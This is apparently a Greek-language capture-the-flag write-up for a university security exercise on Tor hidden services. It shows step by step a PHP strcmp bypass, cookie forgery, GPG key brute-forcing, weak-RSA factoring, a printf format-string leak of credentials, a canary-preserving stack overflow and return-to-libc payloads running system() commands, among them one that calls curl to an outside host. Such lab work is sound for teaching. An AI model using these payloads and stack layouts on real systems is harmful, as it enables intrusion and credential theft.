# Εκφώνηση

![](logo.png)

Ερωτήσεις:

1. Πού βρίσκεται ο Γιώργος;
1. Ποιος έκλεψε τα αρχεία του "Plan X";
1. Πού βρίσκονται τα αρχεία του "Plan X";
1. Ποια είναι τα results του "Plan Y";
1. Ποιο είναι το code του "Plan Z";

### Team TrojanPonies:
<i>by [KazakosVas](https://github.com/KazakosVas), [mansstiv](https://github.com/mansstiv) </i>

# Λύση

## Ερώτημα 1

1. Αρχικά μας δόθηκε ο εξής σύνδεσμος http://2bx6yarg76ryzjdpegl5l76skdlb4vvxwjxpipq4nhz3xnjjh3jo6qyd.onion

2. Χρησιμοποιώντας το view page source ανακαλύψαμε το εξής  link: https://blog.0day.rocks/securing-a-web-hidden-service-89d935ba1c1d

3. Συνειδητοποιήσαμε οτι ο Apache server δεν είχε απενεργοποιήσει την server-info σελίδα η οποία μπορεί να περιέχει διάφορα σημαντικά στοιχεία όπως url κλπ. Έτσι διαβάζοντας τη σελίδα http://2bx6yarg76ryzjdpegl5l76skdlb4vvxwjxpipq4nhz3xnjjh3jo6qyd.onion/server-info ανακαλύψαμε έναν άλλο σύνδεσμο: 
http://flffeyo7q6zllfse2sgwh7i5b5apn73g6upedyihqvaarhq5wrkkn7ad.onion/

4. Θεωρώντας λογικό να πρέπει να βρούμε τον κώδικα που υπάρχει πίσω από το συγκεκριμένο link: https://stackoverflow.com/questions/1319603/how-to-view-php-on-live-site. <br> <br>
![phps1](https://i.ibb.co/JkLVg0P/1.png) <br>
Το phps δεν έμοιαζε ξένο καθώς το είχαμε συναντήσει και στο server-info page. <br> <br>
![phps2](https://i.ibb.co/NZkFBV6/2.png)

5. Οδηγηθήκαμε στο http://flffeyo7q6zllfse2sgwh7i5b5apn73g6upedyihqvaarhq5wrkkn7ad.onion/access.phps το οποίο είχε τον αρκετά απλό γρίφο ```// i set $desired to the 48th multiple of 7 that contains a 7 in its decimal representation``` τον οποίο λύσαμε με το python  πρόγραμμα [multiples.py](https://github.com/mansstiv/Capture-The-Flag/blob/master/src/question1/multiples.py). <br><br>
Βλέποντας απο το κώδικα οτι χρειάζονται 7 ψηφία δώσαμε το user=0001337. Εμπνευσμένοι από το http://danuxx.blogspot.com/2013/03/unauthorized-access-bypassing-php-strcmp.html  για να περάσουμε και τον έλεγχο για το κωδικό δώσαμε το password σα πίνακα. Έτσι με τη χρήση αυτού του link http://flffeyo7q6zllfse2sgwh7i5b5apn73g6upedyihqvaarhq5wrkkn7ad.onion/access.php?user=0001337&password[]=a
προχωρήσαμε στο επόμενο στοιχείο.

6. Εύκολα απο το
http://flffeyo7q6zllfse2sgwh7i5b5apn73g6upedyihqvaarhq5wrkkn7ad.onion/blogposts7589109238/ ανακαλύψαμε το 
http://flffeyo7q6zllfse2sgwh7i5b5apn73g6upedyihqvaarhq5wrkkn7ad.onion/blogposts7589109238/blogposts/
το οποίο έδινε τον αριθμό επισκέπτη <b>#834472</b>.

7. Έχοντας καταλάβει ότι και τα δύο μέλη της ομάδας έχουμε το ίδιο cookie ```"Visitor=MjA0OmZjNTZkYmM2ZDQ2NTJiMzE1Yjg2YjcxYzhkNjg4YzFjY2RlYTljNWYxZmQwNzc2M2QyNjU5ZmRlMmUyZmM0OWE="``` και το γεγονός ότι το cookie σχετίζεται με τον αριθμό 204 που μας εμφανίζεται στον ιστότοπο  YS13-Fixers καταλάβαμε ότι πρέπει να βρούμε ποιο cookie θα αντιστοιχεί στον αριθμό <b>#834472</b>.

8. Ψάχνοντας διάφορα decrypt εργαλεία συναντήσαμε τον <b>base64-decrypt</b> οπότε αποκρυπτογραφήσαμε το cookie και πήραμε το 204:fc56dbc6d4652b315b86b71c8d688c1ccdea9c5f1fd07763d2659fde2e2fc49a. 
Συνειδητοποιήσαμε οτι το 2ο μέρος είναι το <b>sha256(204)</b> οπότε αντίστοιχα υπολογίσαμε το <b>sha256(834472)</b> που ισούται με 27c3af7ef2bee1af527dbf8c05b3db6cca63589941b8d49572aa64b5cd8c5b97 και μετα το base64_encrypt(834472:27c3af7ef2bee1af527dbf8c05b3db6cca63589941b8d49572aa64b5cd8c5b97) που μας έδωσε το <b>νέο μας cookie</b>  ```ODM0NDcyOjI3YzNhZjdlZjJiZWUxYWY1MjdkYmY4YzA1YjNkYjZjY2E2MzU4OTk0MWI4ZDQ5NTcyYWE2NGI1Y2Q4YzViO```<br><br>
Εργαλεία που χρησιμοποιήθηκαν για τους υπολογισμούς των αλγορίθμων base64 και sha256:
https://www.topster.net/text/decodieren_encodieren.html και
https://xorbin.com/tools/sha256-hash-calculator

9. Με τη χρήση του σωστού cookie οδηγηθήκαμε στο http://2bx6yarg76ryzjdpegl5l76skdlb4vvxwjxpipq4nhz3xnjjh3jo6qyd.onion/sekritbackup1843/. 
Για να αποκρυπτογραφήσουμε τα αρχεία με τη χρήση του gpg εργαστήκαμε ως εξής. <br>
Αρχικά φτιάξαμε ένα python program [generatekeys.py](https://github.com/mansstiv/Capture-The-Flag/blob/master/src/question1/generatekeys.py) το οποίο  δημιουργεί υποψήφια κλειδιά. Τα κλειδιά αποτελούνται από όλες τις ημερομηνίες του 2021. Σαν secret χρησιμοποιούν κάποιες λέξεις που θεωρήσαμε πιθανές από ότι έχουμε συναντήσει ως τώρα και απο το https://ropsten.etherscan.io/tx/0xdcf1bfb1207e9b22c77de191570d46617fe4cdf4dbc195ade273485dddc16783 την λέξη <b>bigtent</b>. Έπειτα με το πρόγραμμα [bruteforce.c](https://github.com/mansstiv/Capture-The-Flag/blob/master/src/question1/bruteforce.c) κάναμε brute force για να βρούμε το σωστό κλειδί<br> ```sha256("2021-01-04 bigtent") = a7a7bf50cb39f3d560e0450955d653c46299c323250989cc93c9a2b9e9d1724e```.

10. Αφου βρήκαμε το σωστό κλειδί και διαβάζοντας τον αποκρυπτογραφημένο μήνυμα συνειδητοποιήσαμε πως o κωδικός που δινόταν επρόκειτο για κωδικό commit στο github. Συνεπώς μέσα από το <b>firefox.log</b> ανακαλύψαμε τον εξής σύνδεσμο https://github.com/asn-d6/tor/commit/4ec3bbea5172e13552d47ff95e02230e6dc99692 
στον οποίο εύκολα διακρίνει κανείς οτι περιγράφεται ένα <b>πρόβλημα κρυπτογραφίας RSA</b> με μικρά κλειδιά. Με τον κώδικα από το [findPrimesRSA.py](https://github.com/mansstiv/Capture-The-Flag/blob/master/src/question1/findPrimesRSA.py) βρήκαμε τους πρώτους αριθμούς p και q και ύστερα από το αρχείο [decoderRSA.py](https://github.com/mansstiv/Capture-The-Flag/blob/master/src/question1/decoderRSA.py) κάναμε decode τα ciphertexts που μας είχαν δωθεί και βρήκαμε τα x και y.

11. Στον σύνδεσμο http://aqwlvm4ms72zriryeunpo3uk7myqjvatba4ikl3wy6etdrrblbezlfqd.onion/30637353063735.txt ήταν η απάντηση στο ερώτημά μας. Ο Γιώργος βρίσκόταν στο <b>Gilman's Point του Kilimanjaro</b>.

## Ερώτημα 2

1. Από το προηγούμενο ερώτημα, στο http://flffeyo7q6zllfse2sgwh7i5b5apn73g6upedyihqvaarhq5wrkkn7ad.onion/blogposts7589109238/blogposts/diary2.html διαβάσαμε πως η Υβόνη είχε στήσει online τον pico server της βασιζόμενη στον ακόλουθο κώδικα (github:chatziko/pico). Επίσης δινόταν το παρακάτω link http://zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion/ , που ζητούσε κάποια credentials για να κάνεις login. Στόχος μας λοιπόν ήταν να συνδεθούμε επιτυχώς στο σύστημα.

2. Τότε στήσαμε τοπικά τον pico server υποπτευόμενοι πως το πρόβλημα θα ήταν σχετικό με buffer overflow. Κάνοντας compile τον κώδικα μας εμφανίστηκε το ακόλουθο warning: <b>format not a string literal and no format arguments [-Wformat-security] 135 | printf(auth_username);</b>, που πρακτικά σημαίνει πως δηλώνεται η μεταβλητή auth_username στην printf δίχως να έχει δηλωθεί πρώτα ο τύπος της μεταβλητής αυτής. 

3. Ψάχνοντας περαιτέρω σχετικά με το θέμα <b>Buffer Overflow & Format String Attacks</b> συνειδητοποιήσαμε τα ακόλουθα. Το vulnerability αυτό βασίζεται στα ιδιαίτερα χαρακτηριστικά της γλώσσας C, που επιτρέπει variadic functions όπως string format functions και στην περιπτωσή μας την συνάρτηση printf. Κατ' επέκταση αυτό σημαίνει πως ο compiler εφόσον δεν γνωρίζει το πλήθος των παραμέτρων στο compile time, πρέπει να βασιστεί στους τύπους των μεταβλητών που ορίζονται με τον συγκεκριμένο έλεγχο να γίνεται κατά την εκτέλεση του προγράμματος. 

4. Εδώ βασίζεται και το attack μας. Εφόσον η printf εκτυπώνει input που δίνει ο χρήστης στο username, μην συμπεριλαμβάνοντας τον τύπο της μεταβλητής που εκτυπώνεται, δίνει την ευκαιρία στον χρήστη να δίνει αυθαίρετα όσους τύπους μεταβλητών θέλει, με αποτέλεσμα να διαβαστούν δεδομένα από την στοίβα. 

5. Διαβάζοντας περαιτέρω συνειδητοποιήσαμε πως αυτό μπορεί να γίνει δίνοντας πολλαπλά <b>%x</b> και ένα <b>%s</b>. Εξηγώντας περαιτέρω:
   * Το <b>%x</b> διότι με αυτόν τον τρόπο εκτυπώνονται τα δεδομένα της στοίβας και ταυτόχρονα μετακινείται ο stack pointer.
   * Το <b>%s</b> για να εκτυπώσουμε τα credentials που είναι αποθηκευμένα στην στοίβα στην μορφή <b>"username:password-md5"</b>, όπως φαίνεται από την main.c:<br>
  ```Line htpasswd[100];      // contents of /etc/htpasswd, max 100 entries, format is <username>:<password-md5>``` 

6. Συνεπώς αυτό που έπρεπε να μαντέψουμε ήταν το πλήθος των %x που θα χρειαστούν μέχρι να εκτυπωθούν τα credentials. Μετά από μερικές δοκιμές με το ακόλουθο input <b>%x %x %x %x %x %x %s</b> μας εμφανίστηκαν τα credentials admin:e5614e27f3c21283ad532a1d23b9e29d.

7. Το μόνο που έλειπε ήταν να βρούμε ένα key, για το οποίο ο md5 αλγόριθμος θα έδινε το ίδιο hash value με το παραπάνω string. Χρησιμοποιώντας το site https://crackstation.net/ , βρήκαμε πως ένα πιθανό key είναι το <b>bob's your uncle</b>.

8. Δίνοντας ```username: admin``` και ```password: bob's your uncle``` συνδεθήκαμε επιτυχώς στο σύστημα και βρήκαμε πως <b>τα αρχεία του "Plan X" τα έκλεψαν οι 5l0ppy 8uff00n5.</b>

## Ερώτημα 3

Αφού καταφέραμε να πάρουμε access εισάγοντας τα σωστά credentials (βλ. Ερώτημα 2), έπρεπε να εισάγουμε έναν επιπλέον κωδικό προκειμένου να βρούμε τα κλεμμένα αρχεία. Εισάγοντας έναν τυχαίο κωδικό, συνειδητοποιήσαμε πως η σελίδα που θέλουμε να πάρουμε access είναι η **http://zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion/ultimate.html**, που θα περιείχε τις χρήσιμες αυτές πληροφορίες.<br>

### Συνοπτική επεξήγηση λειτουργίας του pico server

Ξεκινώντας ο server, καλεί την συνάρτηση **serve_forever**, με όρισμα το port 8000. Ο server ακούει συνεχώς στο συγκεκριμένο port, περιμένοντας να δεχθεί αιτήσεις. Με το που δεχθεί μία αίτηση, θα κάνει **fork** και ο κώδικας του child process θα καλέσει την συνάρτηση **respond**, η οποία θα επεξεργαστεί το request του client. Στην συνάρτηση αυτή θα κληθεί η **route**, που με την σειρά της θα εξετάσει τα headers του request και θα κάνει όλους τους απαραίτητους ελέγχους προστασίας. <br>

Ο έλεγχος που μας απασχολεί είναι εκείνος που εξετάζει το admin password, το οποίο έχει σταλθεί σαν post data στο request που έχει πραγματοποιηθεί. Ο κωδικός αυτός συγκρίνεται με τον σωστό κωδικό που υπάρχει τοπικά στο αρχείο <b><i>/etc/admin_pwd</i></b>. Αν ο έλεγχος είναι επιτυχής (βλ. την μεταβλητή **allowed** στον παρακάτω κώδικα), θα κληθεί η συνάρτηση **serve_ultimate** και θα εμφανίσει το περιεχόμενο της σελίδας που θέλουμε, δηλαδή της **ultimate.html**.<br>

```
  // An extra layer of protection: require an admin password in POST
  Line admin_pwd[1];
  read_file("/etc/admin_pwd", admin_pwd, 1);

  char* given_pwd = post_param("admin_pwd");
  int allowed = given_pwd != NULL && strcmp(admin_pwd[0], given_pwd) == 0;

  if (allowed)
    serve_ultimate();
  else
    printf("HTTP/1.1 403 Forbidden\r\n\r\nForbidden");

  free(given_pwd);
```
### Ανάλυση στόχου

Στόχος μας λοιπόν ήταν να κληθεί η **serve_ultimate**, έχοντας παρακάμψει ταυτόχρονα τον έλεγχο της τιμής της μεταβλητής **allowed**, μέσω ενός πιθανού **buffer overflow attack**. Μέσα στην συνάρτηση **route** παρατηρήσαμε πως καλείται η συνάρτηση **post_param**, η οποία κάνει parsing των post data που στάλθηκαν και τα επιστρέφει ξανά στην συνάρτηση **route** για να συνεχιστεί ο έλεγχος. Στην **post_param** ωστόσο, ορίζεται ο στατικά δεσμευμένος πίνακας **post_data**, που περιέχει τα δεδομένα τα οποία στάλθηκαν.<br>

```
  char post_data[payload_size+1];     // dynamic size, to ensure it's big enough
  strcpy(post_data, payload);
```
Τότε λοιπόν, καταλάβαμε πως αυτό που έπρεπε να κάνουμε είναι να στείλουμε τα δεδομένα με τέτοιον τρόπο, έτσι ώστε ο στατικος πίνακας post_data που θα γραφτεί στην στοίβα, να προκαλέσει το buffer overflow και να αλλάξει την τιμή του return address του stack frame της συνάρτησης **post_param**. Να την αλλάξει και να αντικαταστήσει στην θέση της, την διεύθυνση της εντολής που καλεί την **serve_ultimate** μέσα στην συνάρτηση **route** (<b><i>main.c:59</i></b>), έχοντας προσπεράσει επιτυχώς τον έλεγχο της μεταβλητής **allowed**. 

### Ανάλυση επίθεσης

Για να καταλάβουμε την δομή της στοίβας, τρέξαμε τοπικά το εκτελέσιμο με gdb, θέτοντας παράλληλα τα κατάλληλα breakpoints (<b><i>httpd.c:58, main.c:178, main.c:181</i></b>) και παρακολουθώντας μόνο τα child processes που διαχειρίζονται τα requests (<b><i>set follow fork-mode child</i></b>). Παρακάτω φαίνεται η μνήμη της στοίβας για το frame της συνάρτησης **post_param** και πιο συγκεκριμένα 20 words από τον $esp προς διευθύνσεις μεγαλύτερης αξίας (***x/20xw $esp***), ακριβώς πριν την εκτέλεση της εντολής ```strcpy(post_data, payload);```. <br>

```
  0xffffcba0:     0x5655809f      0x565581be      0x00000001      0x56556fd2
  0xffffcbb0:     0xffffcc18      0xf7cef000      0xffffcbe8      0x565580ae
  0xffffcbc0:     0x5655d1a0      0x00000064      0x5655d1a0      0x56556b63
  0xffffcbd0:     0x00000000      0xffffcba0      0x00000001      0x60be5800
  0xffffcbe0:     0x56559f10      0xf7ffb004      0xffffcc88      0x565569ab
```
Πριν φτιαχτεί το αυτοματοποιημένο script που θα αναφερθεί παρακάτω, καθαρά για την κατανόηση της στοίβας και την ενορχήστωση του attack, τρέχαμε την ακόλουθη curl εντολή.<br>
```
curl -d "3" -v 'http://127.0.0.1:8000/ultimate.html' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0' -H 'Accept:  text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Content-Length: 0' -H 'Upgrade-Insecure-Requests: 1' -H 'Authorization: Basic YWRtaW46MTIzNA=='
```
**Σημαντική** ήταν η προσθήκη της παραμέτρου **'Content-Length: 0'**, που έκανε το μέγεθος του buffer να παραμένει σταθερό (payload_size στον κώδικα). Στην παράμετρο **'Authorization: Basic YWRtaW46MTIzNA=='** περιέχεται το Base64 encoded format των credentials που είχαμε θέσει τοπικά στο μηχάνημά μας. <br>

Στην μνήμη όπως φαίνεται παραπάνω ξεκινώντας από τον $esp, μπορούμε να εξάγουμε τις ακόλουθες πληροφορίες:
  * 13 words
  * Διεύθυνση του buffer (&post_data) -> ```0xffffcba0```
  * 1 word
  * Canary -> ```0x60be5800```
  * 2 words
  * Saved $ebp -> ```0xffffcc88```
  * Return address -> ```0x565569ab```
 
 Στόχος μας λοιπόν ήταν αφού εκτελεστεί η εντολή  ```strcpy(post_data, payload);```, η μνήμη που φαίνεται παραπάνω να αντικατασταθεί με:
  * 13 "τυχαία" words
  * Διεύθυνση του buffer (&post_data) να παραμείνει ίδια
  * 1 "τυχαίο" word
  * Canary να παραμείνει ίδιο
  * Το ακριβώς επόμενο word να παραμείνει ίδιο
  * 1 "τυχαίο" word
  * Saved $ebp να παραμείνει ίδιος
  * Διεύθυνση της εντολής που καλεί την serve_ultimate μέσα στην route (***main.c:59***) 

Πλέον η μνήμη θα είναι κάπως έτσι.
<br>
```
  0xffffcba0:     0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa
  0xffffcbb0:     0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa
  0xffffcbc0:     0xaaaaaaaa      0xaaaaaaaa      0xffffcba0      0xffffcbfd
  0xffffcbd0:     0xaaaaaaaa      0xffffcba0      0xaaaaaaaa      0x60be5800
  0xffffcbe0:     0x56559f10      0xaaaaaaaa      0xffffcc88      0x565569e2
  
  (gdb) x/i 0x565569e2
     0x565569e2 <route+443>:      call   0x5655717d <serve_ultimate>

```
<br> Στα πρώτα 13 words όσα δεν είναι padding (0xaaaaaaaa) είναι επειδή έχουν αλλάξει μόνα τους από τον κώδικα μετά την strcpy.

### Υπολογισμός offsets & διαμόρφωση στοίβας

Αφού ολοκληρώσαμε επιτυχώς τοπικά το attack, αλλάζοντας την μνήμη μέσω του gdb με την βοήθεια της εντολής ```set {int} addr1 = addr2```, έπρεπε να βρούμε έναν τρόπο να αντλήσουμε πληροφορίες για την μνήμη της στοίβας του online server, καθώς δεν θα είχαμε την ευχέρεια του gdb όπως την είχαμε τοπικά στο μηχάνημά μας. Τότε σκεφτήκαμε να εκμεταλλευτούμε το vulnerability της printf από το προηγούμενο ερώτημα και να εκτυπώσουμε δεδομένα απο την στοίβα.<br>

![1](https://i.ibb.co/wNVg9X9/Screenshot-2021-07-16-09-32-58.png)<br>

Παρατηρούμε από τις εκτυπώσεις του $ebp και του $esp το μέγεθος του frame της συνάρτησης check_auth είναι **104/4 = 27 words**. Άρα το return address της συνάρτησης θα βρισκόταν 28 words από τον $esp. Όμως παρατηρούμε από την assembly πως η συνάρτηση printf μεγαλώνει την στοίβα κατά 3 words, με αποτέλεσμα να δώσουμε σαν input της print (**"%08x" * 31**). <br>

![2](https://i.ibb.co/d7wTMcH/Screenshot-2021-07-16-09-35-56.png) <br>


Η παραπάνω φωτογραφία δείχνει αναλυτικότερα το ότι πριν την κλήση της printf το return address της συνάρτησης είναι 28 λέξεις πάνω από τον $esp. Tο αποτέλεσμα των δεδομένων της στοίβας μετά το curl request είναι όπως φαίνεται παρακάτω. <br>
```
  Stack Data:

  ['5656d330', '0000009a', '56556cdc', '00000000', '00000000', '5655d4b9', '5655a180', '00000000', '00000000', '5656d330', '0000009a', '00000000', '00000001', '5656d330', '00000000', '565581d1', '0000009a', '00000000', '00000000', '00000000', '00000000', '00000000', '00000000', '00000000', '00000000', '00000000', '60be5800', 'f7cefd20', '56559f10', 'ffffcc88', '5655689d']

  saved_ebp: ffffcc88 // 30ο
  ret_address: 5655689d // 31ο
  canary: 60be5800 // 27ο
  word_after_canary: 56559f10 // 29ο

```

Άρα γνωρίζοντας πως το return address της check auth ισούται με **5655689d** προσθέτοντας 325 (δηλαδή την απόσταση του call <serve_ultimate> απο το πραγματικό return address), επιστρέφουμε στο σημείο που η route καλεί την serve_ultimate. Τα παραπάνω offsets είναι ίδια και στο πραγματικό μηχάνημα που τρέχει ο pico server. <br>

```
  ~ Πώς προκύπτει το 325 ~
  
  (gdb) x/i 0x565569e2
     0x565569e2 <route+443>:      call   0x5655717d <serve_ultimate>
  (gdb) x/i 0x5655689d
     0x5655689d <route+118>:      add    $0x10,%esp
```

Όλα τα παραπάνω συνοψίζονται στο script [question3.py](https://github.com/mansstiv/Capture-The-Flag/blob/master/src/question3_4_5/question3.py), το οποίο αφού τρέξαμε πήραμε τα δεδομένα του **/var/www/pico/ultimate.html**.

```
  <pre>
  Thanks for the coins, I knew I can do business with you.

  Your ssh access to the server should be restored, you can find your
  files under /var/backup/ (see 'backup.log' for a list).

  To avoid losing your files again, hire us!
  5l0ppy 8uff00n5 can help you fix all your security issues.
  Use the code tmmt8pN_lj4 to get 20% off our usual rates!
  </pre>
```
## Ερώτημα 4

Έχοντας βρει από το προηγούμενο ερώτημα την πληροφορία πως τα αρχεία του Plan Y βρίσκονται στην τοποθεσία **/var/backup/backup.log**, είχαμε ως νέο στόχο να εξάγουμε τις πληροφορίες του αρχείου αυτού. Αυτό θα μπορούσαμε να το επιτύχουμε με ένα νέο **buffer overflow attack**, μόνο που αυτήν την φορά κάνοντας override το return address, θα καλούσαμε την συνάρτηση **system("cat /var/backup/backup.log")**, αντί της serve_ultimate. Το συγκεκριμένο attack είναι γνωστό στην βιβλιογραφία και ως **Return-to-libc attack** και είναι ο τρόπος να προσπεράσουμε το non-executable stack protection.

### Ανάλυση επίθεσης
Γνωρίζοντας πλέον πως είναι η στοίβα όταν πάει να επιστρέψει η post_param ξέραμε ότι το return address είναι η τελευταία λέξη που εκτυπώνεται απο την εντολή x/20xw $esp. Τα επόμενα δυο words πρέπει να είναι τα: 
  * 0xAAAAAAAA (padding) και 
  * η διεύθυνση του 1ου byte του της συμβολοσειράς που θέλουμε να είναι το argument της system.


### Υπολογισμός offsets & διαμόρφωση στοίβας
Αρχικά υπολογίσαμε το offset στο τοπικό μας μηχάνημα με τον εξής τρόπο (προσοχή στον υπολογισμό του offset δεν πρέπει να χρησιμοποιείται gdb γιατί δεν γίνονται randomize οι διευθύνσεις): 

1) Προσθέσαμε στην main τον παρακάτω κώδικα ο οποίος μας εκτυπώνει την διέυθυνση της system. <br>
```
  int (*ptr_to_main)() = system;
  for (i=0; i<sizeof ptr_to_main; i++)
      printf("%.2x", ((unsigned char *)&ptr_to_main)[i]);
  putchar('\n');
```
(Προσοχή το output της παραπάνω εκτύπωσης θέλει convert big to little endian) 

2) Παρατηρήσαμε (στο τοπικό μας μηχάνημα) πως από τη vulnerable printf η 28η τιμή (όταν δίνουμε input **"%08x"** * 31) είναι κοντά στη συνάρτηση system και η διαφορά τους είναι σταθερή. Έτσι βρήκαμε το offset για την system, δηλαδή το τρόπο που θα βρίσκουμε τη συνάρτηση system γνωρίζοντας την τιμή του 28ου word. Η συγκεκριμένη επίθεση δεν δούλεψε, οπότε καταλάβαμε ότι τα offset στον πραγματικό pico-server θα είναι διαφορετικά. Στη συνέχεια στήσαμε τον pico server στο linux02 (εκεί έγινε compile ο πραγματικός pico-server) και με τον ίδιο τρόπο βρήκαμε το offset που θέλαμε:

```
linux02:/home/users/sdi1700040/security/pico-master>./server
System (needs reverse big to little endian): e072a8f7
Server started http://127.0.0.1:32465

linux02:/home/users/sdi1700040/security/pico-master>curl -d "3" -v 'http://127.0.0.1:32465/ultimate.html' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Content-Length: 0' -H 'Upgrade-Insecure-Requests: 1' -H 'Authorization: Basic JTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eAo='
<a lot http info
< HTTP/1.1 401 Unauthorized
< WWW-Authenticate: Basic realm="Invalid user: 57d13160 0000009b 565e7526 00000000 00000000 57d1388a 565ea180 00000000 00000000 57d13160 0000009b 00000000 00000001 57d13160 00000000 565e8585 0000009b 00000000 00000000 00000000 00000000 00000000 c5397000 00000000 00000000 f7ac1deb c5397000 f7c22d80 565e9f08 ffd11b38 565e70f1
< "
* no chunk, no close, no size. Assume close to signal end
< 
* Closing connection 0
linux02:/home/users/sdi1700040/security/pico-master>
```
<br>

'Ετσι κάνοντας την πράξη **0xf7c22d80-0xf7a872e0 = 0x19BAA0 = 1686176** βρήκαμε το πραγματικό offset για την system.

 Στόχος μας λοιπόν ήταν αφού εκτελεστεί η εντολή  ```strcpy(post_data, payload);```, η μνήμη που φαίνεται παραπάνω (βλ ερώτημα 3) να αντικατασταθεί με:
  * 13 "τυχαία" words
  * Διεύθυνση του buffer (&post_data) να παραμείνει ίδια
  * 1 "τυχαίο" word
  * Canary να παραμείνει ίδιο
  * Το ακριβώς επόμενο word να παραμείνει ίδιο
  * 1 "τυχαίο" word
  * Saved $ebp να παραμείνει ίδιος
  * Διεύθυνση της  system 
  * Ένα τυχαίο word (κάποιες φορές δίνεται η διέυθυνση της exit)
  * Διέυθυνση του πρώτου byte της συμβολοσειράς που αποτελέι arguement της system = Διέυθυνση του αμέσως επόμενου word
  * ```cat /var/backup/backup.log``` (string to execute with system)

Τρέχοντας τα παραπάνω στο script [question4_5.py](https://github.com/mansstiv/Capture-The-Flag/blob/master/src/question3_4_5/question4_5.py) πήραμε το ακόλουθο output. <br>

```
  Computing, approximate answer: 41.998427123123
  ...



  Plan Z: troll humans who ask stupid questions (real fun).
  I told them I need 7.5 million years to compute this XD

  In the meanwhile I'm travelling through time trolling humans of the past.
  Currently playing this clever dude using primitive hardware, he's good but the
  next move is crushing...

  1.e4 c6 2.d4 d5 3.Nc3 dxe4 4.Nxe4 Nd7 5.Ng5 Ngf6 6.Bd3 e6 7.N1f3 h6 8.Nxe6 Qe7 9.0-0 fxe6 10.Bg6+ Kd8 11.Bf4 b5 12.a4 Bb7 13.Re1 Nd5 14.Bg3 Kc8 15.axb5 cxb5 16.Qd3 Bc6 17.Bf5 exf5 18.Rxe7 Bxe7

  PS. To reach me in the past use the code: "<next move><public IP of this machine>"
```

## Ερώτημα 5

Έχοντας υλοποιήσει επιτυχώς το **Return-to-libc attack** από το προηγούμενο ερώτημα με την system, ήταν πλέον εύκολο να απαντήσουμε σε αυτήν την ερώτηση. Από το παραπάνω output του αρχείου **z.log**, παρατηρήσαμε πως ο κωδικός του Plan Z αποτελούταν από 2 μέρη, την ***'next move'*** και το ***'public IP of this machine'***. <br>

* Για το ***'next move'***
  * ψάχνοντας στο διαδίκτυο τις πληροφορίες 1.e4 c6 2.d4 d5 3.Nc3 dxe4 4.Nxe4 Nd7 5.Ng5 Ngf6 6.Bd3 e6 7.N1f3 h6 8.Nxe6 Qe7 9.0-0 fxe6 10.Bg6+ Kd8 11.Bf4 b5 12.a4 Bb7 13.Re1 Nd5 14.Bg3 Kc8 15.axb5 cxb5 16.Qd3 Bc6 17.Bf5 exf5 18.Rxe7 Bxe7, συνειδητοποιήσαμε πως αυτός ο συνδυασμός γραμμάτων-αριθμών πρόκειται για κινήσεις ενός αγώνα σκακιού και πιο συγκεκριμένα του **Deep Blue versus Kasparov, 1997, Game 6**. Συνεπώς βρήκαμε πως η επόμενη και 19η κίνηση του αγώνα αυτού είναι η **c4**.<br>

* Για την ***'public IP of this machine'***
  * τρέξαμε όπως πριν ένα **Return-to-libc attack** με σκοπό να εκτελεστεί η εντολή ```system("curl ifconfig.me")```, που θα μας επέστρεφε την public IP, η οποία ήταν η **54.159.81.179**. <br>

<!-- Το script που τρέξαμε για το ερώτημα 4 και 5 μπορείτε να το βρείτε στο [question4_5.py](src/question3_4_5/question4_5.py).
 -->
Το script που τρέξαμε για το ερώτημα 4 και 5 μπορείτε να το βρείτε στο [question4_5.py](https://github.com/mansstiv/Capture-The-Flag/blob/master/src/question3_4_5/question4_5.py).

## Τρέξιμο των scripts
Για το τρέξιμο των scripts των ερωτημάτων 3,4 και 5 απλά τρέξτε ```./run.sh```. Ίσως χρειαστεί λίγος χρόνος για να εμφανιστούν όλα τα outputs, καθώς πραγματοποιούνται διάφορα curl requests στα ".onion" links.





